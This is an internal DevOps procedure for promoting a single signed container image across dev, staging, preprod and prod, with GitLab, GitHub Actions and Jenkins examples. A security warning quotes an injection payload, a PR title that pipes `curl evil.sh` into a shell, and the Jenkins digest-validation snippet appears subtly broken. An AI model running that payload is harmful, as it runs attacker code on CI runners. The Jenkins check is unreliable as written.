# Environment Promotion Procedure — Build Once, Move One Artifact

How a change gets from a developer's branch to production: what is built, what
is promoted, what is *not* rebuilt, which values are injected where, and who
approves each hop.

Companion to [05-cicd-automation.md](05-cicd-automation.md) (the pipelines
themselves) and [10-deployment-strategies.md](10-deployment-strategies.md) (how
the traffic shifts once the artifact lands).

---

## 0. The one rule everything else derives from

> **Promotion moves a reference, not code.**
> The image is built exactly once, in one place, from one commit. Every
> environment afterwards runs *that byte-identical image*. Promotion is a commit
> that changes a digest string in a config file. Nothing else.

If your pipeline builds in dev and builds again for prod, you do not have a
promotion process — you have four independent releases that happen to share a
git history, and "it worked in staging" carries no information.

**What this forbids, concretely:**

| Anti-pattern | Why it breaks the guarantee |
|---|---|
| `docker build` in the prod deploy job | Different base-image layer, different CVE set, different binary |
| Per-environment Dockerfiles or build args | The artifact you tested is not the artifact you shipped |
| Baking config into the image at build time | Forces a rebuild per env, which forces the above |
| Deploying by tag (`v1.4.2`) rather than digest | Tags are mutable; a compromised or careless push repoints them |
| Rebuilding "to pick up the latest security patches" before prod | Patch by building a *new* release and promoting it from dev again |

---

## 1. The environment ladder

| # | Env | Proves | Data | Deploy trigger | Approval | Typical dwell |
|---|---|---|---|---|---|---|
| 1 | **dev** | It builds, unit tests pass, it starts | Synthetic | Auto on merge to `main` | None | Minutes |
| 2 | **staging** | Integration works; contract tests pass; migrations apply | Masked copy, small | Auto after dev is green | None | Hours |
| 3 | **preprod** | It survives *prod-shaped* load, prod-shaped config, and a restore drill | Masked prod copy, full size | Manual | 1 approver | 1–3 days |
| 4 | **prod** | Customers | Live | Manual, via merge request | 2 approvers + change ticket | — |

**preprod is the environment people try to cut, and it is the one that earns its
keep.** It is the only place where a config difference, a connection-pool limit,
a certificate chain or a migration lock timeout can bite you *before* it bites a
customer. If preprod is not prod-shaped — same cluster topology, same ingress,
same Vault paths, same data volume, same instance sizes — it is a second staging
and you should say so out loud rather than pretend.

> **Naming inconsistency to resolve:** [00-master-plan.md](00-master-plan.md) §2
> uses `dev / sit / uat / prod / dr`. This document uses
> `dev / staging / preprod / prod`. They map 1:1 (`sit`→`staging`,
> `uat`→`preprod`), but **pick one set of names and use it everywhere** —
> in Vault paths, namespaces, ArgoCD projects, and dashboards. Two vocabularies
> for the same ladder causes real incidents when someone deploys to the env they
> thought they meant.

### 1.1 Hard boundaries between environments

Not conventions — enforced controls:

- **No shared credentials.** Separate Vault namespace per env, separate registry
  robot accounts, separate cluster service accounts.
- **No network path from lower envs to prod.** A staging pod must not be able to
  reach the prod database, even with the right password.
- **No data flowing upward** (prod → lower) except through the approved masking
  pipeline, with a ticket.
- **Prod approvers cannot be the change author.** Enforced by branch protection,
  not by asking nicely.

---

## 2. Stage A — Build the artifact (happens exactly once)

Triggered by: merge to `main`. Runs in the trusted CI runner pool.

### 2.1 Procedure

| Step | Action | Gate — build fails if |
|---|---|---|
| A1 | Checkout at an exact commit SHA | — |
| A2 | Lint, unit test, coverage | Coverage below threshold |
| A3 | Secret scan (`gitleaks`) | Any finding |
| A4 | SAST + dependency audit | Any Critical, or High without a dated waiver |
| A5 | `docker build` — multi-stage, digest-pinned bases, non-root, distroless | Base image not from the internal mirror |
| A6 | Capture the **digest** from the push | — |
| A7 | Trivy scan the built image | Critical CVE with a fix available |
| A8 | Generate SBOM (CycloneDX), attach as an attestation | — |
| A9 | `cosign sign` by digest, keyless via CI OIDC | — |
| A10 | Emit the digest as a pipeline output | — |

**A9 is not optional.** Kyverno's `require-signed-images` policy
(`security/kyverno/baseline-policies.yaml`) rejects unsigned images at
admission, so an unsigned build simply cannot deploy — the failure is loud and
early rather than a silent downgrade of security posture.

### 2.2 Tagging scheme

Push **three** references to the same digest, each with one job:

| Reference | Example | Purpose | Mutable? |
|---|---|---|---|
| Digest | `sha256:9f2c…` | **The only thing ever deployed** | No, by construction |
| Semantic tag | `1.4.2` | Human communication, release notes, audit | Should be immutable — enforce it |
| Traceability tag | `1.4.2-a1b2c3d` | Maps artifact → commit without a lookup | Never reused |

Rules:
- **Enforce tag immutability in the registry** (Harbor: Immutability Rules). A
  mutable `1.4.2` means your audit trail is fiction.
- **`latest` is never pushed.** Not for convenience, not for dev. Its existence
  is an invitation.
- **Never deploy by tag.** The manifest carries `image: registry/app@sha256:…`.
  The semantic tag appears in the *commit message* of the promotion, not in the
  manifest.
- Retention: keep every digest deployed to prod **forever** (or for your
  regulatory retention). Prune untagged dev builds after 30 days. You cannot
  investigate an incident against an image you garbage-collected.

---

## 3. Stage B — The config that differs per environment

The image is identical everywhere, so *everything* that varies has to live
outside it. Classify every value before you place it:

| Kind | Example | Where it lives | Changes require |
|---|---|---|---|
| **Build-time constant** | Language runtime, compiled deps | Inside the image | A new build |
| **Environment config** | Log level, feature toggles, pool size, upstream URLs | Kustomize overlay / ConfigMap, in git | A commit |
| **Secret** | DB password, API key, signing key | Vault → External Secrets → Secret | Nothing in git, rotates on its own |
| **Identity** | Vault role, K8s ServiceAccount, OIDC audience | Overlay, in git | A commit + a Vault policy change |
| **Runtime toggle** | Kill switch, progressive release flag | Feature-flag service | A click, audited |
| **The artifact reference** | `@sha256:…` | Overlay `kustomization.yaml` | **A promotion** |

**The test:** if changing a value requires a rebuild, it is in the wrong place.

**The trap:** an env var whose *name* is the same in every environment but whose
*value* silently defaults when missing. `LOG_LEVEL` defaulting to `debug` in
prod because the overlay forgot it is how a bank leaks PII into a log
aggregator. Fail closed — the app should refuse to start on a missing required
variable rather than pick a default. `apps/payment-service/src/main.py` does
this deliberately.

---

## 4. Stage C — Passing dynamic values through CI

This is the mechanical question: the build job computes a digest; the deploy job
needs it. Each CI system does it differently and each has one sharp edge.

### 4.0 The shape, independent of tooling

```
 build job ──► produces: DIGEST=sha256:9f2c…
                    │
                    ▼  (job output / artifact, never a global mutable variable)
 promote job ──► writes DIGEST into gitops/…/overlays/<env>/kustomization.yaml
                    │
                    ▼  (git commit — the audit record)
 ArgoCD ──────► pulls, syncs, reports health
```

Notice the deploy step is a **git commit**, not a `kubectl apply`. CI never
holds prod cluster credentials; ArgoCD pulls. This is the single most valuable
structural decision in the whole pipeline — a compromised runner cannot reach
prod, because there is nothing to reach with.

### 4.1 GitLab CI

**Passing a computed value between jobs — `dotenv` artifacts:**

```yaml
build:
  stage: build
  script:
    - |
      DIGEST=$(skopeo inspect --format '{{.Digest}}' docker://$IMAGE:$CI_COMMIT_SHA)
      echo "DIGEST=$DIGEST" >> build.env
      echo "VERSION=$(cat VERSION)" >> build.env
  artifacts:
    reports:
      dotenv: build.env        # ← the mechanism. NOT a plain artifact file.

promote-staging:
  stage: promote
  needs:
    - job: build
      artifacts: true          # ← required, or $DIGEST is empty and you deploy
                               #   whatever the overlay already had. Silent.
  script:
    - ./ci/scripts/bump-digest.sh gitops business/payment-service/overlays/staging "$DIGEST"
  environment:
    name: staging
```

**Variable precedence — highest wins.** Memorise this; it explains almost every
"but I set that variable" bug:

| # | Source |
|---|---|
| 1 | Manual-run / trigger / scheduled-pipeline variables |
| 2 | Project variables |
| 3 | Group variables |
| 4 | Instance variables |
| 5 | Inherited `dotenv` variables (from `needs`) |
| 6 | Job-level `variables:` in `.gitlab-ci.yml` |
| 7 | Global `variables:` in `.gitlab-ci.yml` |
| 8 | Deployment variables |
| 9 | Predefined (`CI_COMMIT_SHA`, …) |

A project variable **overrides** your `dotenv` digest. If someone once set
`DIGEST` in project settings for a debug session, every promotion afterwards
ships that stale image and the pipeline goes green. Name pipeline-internal
variables distinctly (`BUILD_DIGEST`) so they cannot collide with a settings
entry.

**Manual input for a targeted deploy:**

```yaml
deploy-preprod:
  stage: deploy
  when: manual
  variables:
    TARGET_DIGEST:
      value: ""
      description: "Digest to deploy. Empty = use the one built by this pipeline."
  environment:
    name: preprod
    url: https://preprod.bank.internal
    on_stop: rollback-preprod
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
```

**Environment-scoped variables** (Settings → CI/CD → Variables, scope
`preprod`) are how you give the same variable name a different value per env
without any `if` logic in the pipeline. Combine with **protected** (only
protected branches/tags can read it) and **masked** (redacted in logs).

**Sharp edges:**
- `needs: artifacts: true` is easy to omit and fails *silently* — add an
  `[ -n "$DIGEST" ]` assertion at the top of every promote script.
- Masked variables are masked in *job logs only*. A variable echoed into an
  artifact, an MR description, or a downstream API call is not masked.
- `environment:` is not decoration — it drives the deployment history, the
  "rollback" button, and environment-scoped variable resolution.

### 4.2 GitHub Actions

**Job outputs:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write            # OIDC to Vault — no static secrets
      packages: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ${{ env.IMAGE }}:${{ github.sha }}
        # build-push-action exposes the pushed digest directly — do not parse
        # `docker inspect` output for it.

  promote-preprod:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: preprod              # ← where required-reviewer gates are configured
      url: https://preprod.bank.internal
    steps:
      - run: ./ci/scripts/bump-digest.sh gitops overlays/preprod "$DIGEST"
        env:
          DIGEST: ${{ needs.build.outputs.digest }}
```

**`vars` vs `secrets`:** `${{ vars.X }}` for non-sensitive per-environment
config (URLs, sizes, feature toggles), `${{ secrets.X }}` for credentials.
Both can be scoped to an *environment*, which is how one workflow serves four
envs with no branching.

**Manual input:**

```yaml
on:
  workflow_dispatch:
    inputs:
      digest:
        description: "Image digest to promote (sha256:…)"
        required: true
      environment:
        type: choice
        options: [staging, preprod, prod]
```

**Sharp edges:**
- **Environment secrets require the job to declare `environment:`.** Without it,
  `secrets.DB_PASSWORD` resolves to an empty string and your deploy runs with a
  blank credential rather than failing.
- **Reusable workflows do not inherit secrets** — you must pass them explicitly
  or use `secrets: inherit`. `inherit` is convenient and over-broad; prefer
  explicit.
- **Never interpolate untrusted input into `run:`.**
  `run: echo "${{ github.event.pull_request.title }}"` is a shell-injection
  vector — a PR titled `"; curl evil.sh | sh; #` executes on your runner. Pass
  it via `env:` and reference `$TITLE` instead. This is the most common critical
  finding in Actions security reviews.
- Pin third-party actions **by commit SHA**, not by tag. `@v4` is a moving
  target controlled by someone else.

### 4.3 Jenkins

```groovy
pipeline {
  agent none                       // ← see the sharp edge below
  parameters {
    string(name: 'DIGEST', defaultValue: '',
           description: 'Image digest to deploy (sha256:...)')
    choice(name: 'TARGET_ENV', choices: ['staging', 'preprod', 'prod'])
  }
  stages {
    stage('Validate input') {
      agent { label 'linux' }
      steps {
        script {
          if (!params.DIGEST ==~ /^sha256:[a-f0-9]{64}$/) {
            error "DIGEST must be a full sha256 digest, got: '${params.DIGEST}'"
          }
        }
      }
    }
    stage('Approve') {
      when { expression { params.TARGET_ENV == 'prod' } }
      // No `agent` here — the input step must not hold an executor.
      steps {
        timeout(time: 4, unit: 'HOURS') {
          input message: "Deploy ${params.DIGEST} to prod?",
                submitter: 'release-managers',
                submitterParameter: 'APPROVER'
        }
      }
    }
    stage('Deploy') {
      agent { label 'linux' }
      steps {
        withCredentials([string(credentialsId: 'vault-role-id', variable: 'ROLE_ID')]) {
          sh './ci/scripts/bump-digest.sh gitops overlays/$TARGET_ENV "$DIGEST"'
        }
      }
    }
  }
}
```

**Sharp edges:**
- **`input` inside a stage with an agent pins an executor for the whole wait.**
  Four pending prod approvals can starve your entire build farm. Use
  `agent none` at the top and give `input` stages no agent.
- **`withCredentials` masks in the console log, not in a file you write.**
  `sh 'echo $PASSWORD > /tmp/p'` defeats it entirely.
- Values do not flow between stages unless you put them in `env.X` or `stash`
  them. Scripted-pipeline local variables vanish.
- Jenkins is the right tool for **VM orchestration with human approval gates**
  (see `ci/jenkins/Jenkinsfile.vm-deploy`) and the wrong tool for building
  container images. Do not spread the build across two systems.

### 4.4 Side by side

| Need | GitLab CI | GitHub Actions | Jenkins |
|---|---|---|---|
| Value from job A → job B | `artifacts: reports: dotenv` + `needs: artifacts: true` | `outputs:` + `needs.a.outputs.x` | `stash` / `env.X` |
| Manual input | `when: manual` + `variables: {value, description}` | `workflow_dispatch.inputs` | `parameters {}` |
| Per-env config | Environment-scoped variables | Environment `vars` | Folder properties / config file |
| Approval gate | Protected environment | Environment required reviewers | `input` with `submitter` |
| Secrets without static creds | `id_tokens` → Vault JWT auth | `id-token: write` → Vault | Vault plugin / AppRole |
| Deployment history | `environment:` | `environment:` | Manual |
| **Silent-failure mode to guard** | missing `artifacts: true` | missing `environment:` | lost stage-local variable |

**In all three: assert the value is non-empty and well-formed before using it.**
`ci/scripts/bump-digest.sh` already refuses anything that is not
`^sha256:[a-f0-9]{64}$`. That single regex has prevented more bad deploys than
any dashboard.

---

## 5. Stage D — The promotion procedure itself

### 5.1 dev (automatic)

1. Merge to `main` → Stage A runs → digest produced.
2. CI commits the digest to `overlays/dev/kustomization.yaml` directly.
3. ArgoCD syncs (`selfHeal: true`, `prune: true`).
4. **Exit criteria:** app Healthy in ArgoCD, smoke suite green, no new alerts.

No approval, no ceremony. If dev is ever broken for more than an hour, that is
an incident — it blocks everyone behind you.

### 5.2 dev → staging (automatic, gated on evidence)

1. Wait for dev to be Healthy for ≥10 minutes.
2. CI commits the **same digest** to `overlays/staging/`.
3. Migrations run as a PreSync hook (expand phase only — see
   [10-deployment-strategies.md](10-deployment-strategies.md) §4).
4. Integration + contract test suite runs against staging.
5. **Exit criteria:** all suites green; migration applied and reversible; no
   error-rate regression vs. the previous release.

### 5.3 staging → preprod (manual, 1 approver)

This is the real test. Do not skip a single step.

| # | Step | Evidence produced |
|---|---|---|
| 1 | Confirm the digest is byte-identical to staging's | `diff` of the two overlays shows only the env name |
| 2 | Promote (manual job / `workflow_dispatch`) | Commit SHA in the gitops repo |
| 3 | Run the **performance test** at prod-expected peak ×1.5 | p99 latency, error rate, saturation graphs |
| 4 | Run the **restore drill** if this release touches schema | Measured RTO, attached to the change ticket |
| 5 | Verify config parity with prod | `kustomize build` diff of preprod vs prod overlays — the only differences should be hostnames, replica counts and secret paths |
| 6 | Soak ≥24h with production-shaped traffic | Clean alert history |
| 7 | Verify the **rollback** by actually rolling back and forward again | Timed rollback, recorded |

**Step 7 is the one everybody skips and the one that matters.** A rollback plan
you have not executed is a hypothesis. Roll back in preprod, confirm the app
works on the previous digest, then roll forward. Now you know.

**Step 5 is the second-most-skipped.** Config drift between preprod and prod is
what makes a clean preprod run meaningless. Automate the diff and fail the
promotion on unexpected keys.

### 5.4 preprod → prod (manual, 2 approvers + change ticket)

1. **Pre-flight** — all must be true, checked mechanically:
   - Not inside a freeze window ([09-runbooks.md](09-runbooks.md))
   - Change ticket approved, with the rollback command written in it
   - Preprod soak ≥24h with no Sev1/Sev2
   - On-call engineer is aware and available
   - No other prod change in flight
2. **CI opens a merge request** against the gitops repo changing exactly one
   line: the digest in `overlays/prod/kustomization.yaml`.
   **The runner never merges.** A human with prod rights merges it.
3. Two approvers, neither of them the author, review the MR. The diff is one
   line — this is the point. A one-line diff can actually be reviewed.
4. Merge → ArgoCD syncs → Argo Rollouts begins the canary
   (5% → 25% → 50% → 100%, with automated analysis and auto-abort).
5. **Watch, do not wander.** The author stays present through the full canary.
6. **Post-deploy verification:** `ci/scripts/smoke.sh` against prod, error-budget
   burn rate flat, business metrics (payment success rate, reconciliation drift)
   within band.
7. Close the change ticket with the deployed digest and the observed metrics.

### 5.5 What "promoted" means for the VM track

Same rule, different mechanism. The artifact is a signed container image or an
RPM; `infra/ansible/playbooks/deploy-app.yml` takes `app_version` and refuses
`latest`. Promotion = running the playbook against the next environment's
inventory with the same version string. `PREVIOUS_VERSION` is recorded before
anything changes, so rollback is a re-run rather than an improvisation.

---

## 6. Security gates — which one runs where, and why not everywhere

Running every scan at every stage sounds rigorous and is actually harmful: it
slows the loop until people route around it.

| Gate | dev | staging | preprod | prod | Rationale |
|---|---|---|---|---|---|
| Secret scan | ✅ pre-commit + CI | — | — | — | Cheapest at the earliest point; nothing downstream can fix a leaked key |
| SAST / dependency audit | ✅ | — | — | — | Source hasn't changed after the build |
| Image CVE scan | ✅ at build | — | 🔁 re-scan | 🔁 re-scan | The *image* doesn't change, but the CVE database does |
| Signature verification | ✅ | ✅ | ✅ | ✅ | Admission control, every time, everywhere |
| IaC scan (Checkov/tfsec) | ✅ on the IaC MR | — | — | — | Tied to the Terraform change, not the app promotion |
| DAST | — | ✅ | ✅ | — | Needs a running app; never point DAST at prod |
| Performance test | — | — | ✅ | — | Only meaningful against prod-shaped infra |
| Restore drill | — | — | ✅ | 🔁 quarterly | See [07-backup-dr.md](07-backup-dr.md) |
| Penetration test | — | — | ✅ | — | Per release train, not per deploy |

**The re-scan rows are the subtle ones.** A digest that was clean on Monday can
be Critical on Friday because a new CVE was published — the image did not
change, the world did. Schedule a nightly re-scan of every digest currently
deployed, and alert on prod. That is how you find out you are exposed *before*
the auditor does.

---

## 7. When promotion fails

| Failure | Immediate action | Then |
|---|---|---|
| Build fails | Nothing deployed. Fix forward | — |
| Staging tests fail | Stop. Digest never reaches preprod | Fix, rebuild, restart from dev |
| Preprod perf regression | Do not promote | Profile against the previous digest to isolate |
| Canary auto-aborted in prod | Already handled — traffic is back on stable | **Investigate before retrying.** A silent auto-rollback that nobody reads means the bug ships next time |
| Prod healthy but business metric wrong | Roll back on the business signal, not the technical one | This is why `PaymentReconciliationDrift` exists as an alert |
| Bad migration already applied | **Do not roll back the schema.** Roll back the app to the previous digest — expand/contract guarantees N-1 still works | Fix forward in the next release |
| Prod is broken and the cause is unclear | Roll back first, diagnose second | Restoring service is not the same activity as understanding the failure |

**Rollback is always to a digest you have already run.** Never to "the previous
tag", never to a fresh build of an older commit — that is a new, untested
artifact wearing an old name.

---

## 8. Never do this

1. Rebuild the image for a different environment.
2. Deploy by tag instead of digest.
3. Let CI hold prod cluster credentials. ArgoCD pulls; CI proposes.
4. Let the pipeline merge its own promotion MR to prod.
5. Skip preprod "because it's a small change". Small changes cause most outages;
   they are the ones nobody reviews carefully.
6. Promote on a Friday afternoon or into a freeze window without an incident
   justification and an explicit override.
7. Use a variable name in the pipeline that also exists in project settings.
8. Interpolate untrusted input into a shell step (`${{ }}` into `run:`).
9. Store a secret in a CI variable when an OIDC → Vault exchange is available.
10. Mark a promotion "done" before the post-deploy verification has run.

---

## 9. One-page promotion checklist

```
ARTIFACT
[ ] Built once, from a merge commit on main
[ ] Signed (cosign), SBOM attached
[ ] Image CVE scan clean, or waivers dated and approved
[ ] Digest recorded; tag immutability enforced in the registry

BEFORE PREPROD
[ ] Same digest as staging — verified, not assumed
[ ] Migrations are expand-phase only, N-1 compatible
[ ] Perf test at peak x1.5 passed
[ ] Config diff preprod↔prod reviewed; only expected keys differ
[ ] Rollback executed for real, and timed

BEFORE PROD
[ ] Preprod soak >=24h, no Sev1/Sev2
[ ] Not in a freeze window
[ ] Change ticket approved, rollback command written in it
[ ] 2 approvers identified, neither is the author
[ ] On-call aware; author available for the full canary
[ ] Dashboards open: error rate, latency, saturation, business metric

AFTER PROD
[ ] Canary completed without abort
[ ] Smoke suite green against prod
[ ] Error budget burn flat for 30 min
[ ] Business metric within band
[ ] Change ticket closed with the deployed digest
```

---

## 10. Where the implementation lives

| Concept | File |
|---|---|
| Build, scan, sign, promote pipeline | `ci/gitlab/templates/security.yml`, `docs/05-cicd-automation.md` §2 |
| Digest promotion (with the `sha256` guard) | `ci/scripts/bump-digest.sh` |
| Post-deploy verification | `ci/scripts/smoke.sh` |
| VM rollout with approval + auto-rollback | `ci/jenkins/Jenkinsfile.vm-deploy` |
| Per-environment overlays | `gitops/business/payment-service/overlays/{dev,prod}/` |
| ArgoCD Applications per env | `gitops/apps/business/{dev,prod}/` |
| Signature enforcement at admission | `security/kyverno/baseline-policies.yaml` |
| Canary + automated analysis | `gitops/business/payment-service/base/rollout.yaml` |
| VM promotion (`app_version`, `PREVIOUS_VERSION`) | `infra/ansible/playbooks/deploy-app.yml` |

> **Gap to close:** the repo currently has overlays and Applications for `dev`
> and `prod` only. Add `staging/` and `preprod/` under
> `gitops/business/payment-service/overlays/` and `gitops/apps/business/` before
> this procedure is real — a four-rung ladder documented against a two-rung
> implementation is worse than either.
